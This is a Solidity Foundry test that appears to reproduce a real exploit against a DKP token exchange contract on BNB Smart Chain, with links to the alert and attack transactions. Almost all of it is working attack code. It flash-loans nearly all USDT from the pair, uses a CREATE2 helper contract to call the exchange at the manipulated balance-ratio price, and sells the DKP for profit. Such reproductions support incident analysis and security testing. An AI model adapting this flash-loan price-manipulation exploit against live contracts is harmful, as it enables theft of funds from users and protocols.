// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/CertiKAlert/status/1633421908996763648
// @TX
// https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271
// https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01
// @Summary
// There is an exchange method in the 0x89257 closed source contract for users to swap USDT for DKP tokens,
// but the price Oracle used is the ratio of the balance of the two tokens in the USDT-DKP pair,
// and the attacker manipulates this price through flashLoan, swapping a very small amount of USDT for a large amount of DKP and selling it for a profit

interface IDKPExchange {
    function exchange(uint256 amount) external;
}

contract ContractTest is Test {
    IERC20 DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDKPExchange DKPExchange = IDKPExchange(0x89257A52Ad585Aacb1137fCc8abbD03a963B9683);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 26_284_131);
        cheats.label(address(DKP), "DKP");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(Router), "Router");
        cheats.label(address(DKPExchange), "DKPExchange");
    }

    function testExploit() public {
        deal(address(USDT), address(this), 800 * 1e18);
        exchangeDKP();
        DKPToUSDT();

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)) - 800 * 1e18, USDT.decimals()
        );
    }

    function exchangeDKP() internal {
        uint256 flashAmount = USDT.balanceOf(address(Pair)) * 9992 / 10_000;
        Pair.swap(flashAmount, 0, address(this), abi.encode(flashAmount));
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        bytes memory contractByteCode = type(ExchangeDKP).creationCode;
        uint256 salt = uint256(keccak256("salt"));
        address receiver = getAddress(contractByteCode, salt);
        USDT.transfer(receiver, 100 * 1e18);
        new ExchangeDKP{salt: keccak256("salt")}();
        uint256 returnAmount = abi.decode(data, (uint256)) * 10_000 / 9975 + 1000;
        USDT.transfer(address(Pair), returnAmount);
    }

    function DKPToUSDT() internal {
        DKP.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(DKP);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DKP.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }
}

contract ExchangeDKP {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19);
    IDKPExchange DKPExchange = IDKPExchange(0x89257A52Ad585Aacb1137fCc8abbD03a963B9683);

    constructor() {
        USDT.approve(address(DKPExchange), type(uint256).max);
        DKPExchange.exchange(100 * 1e18);
        DKP.transfer(msg.sender, DKP.balanceOf(address(this)));
    }
}
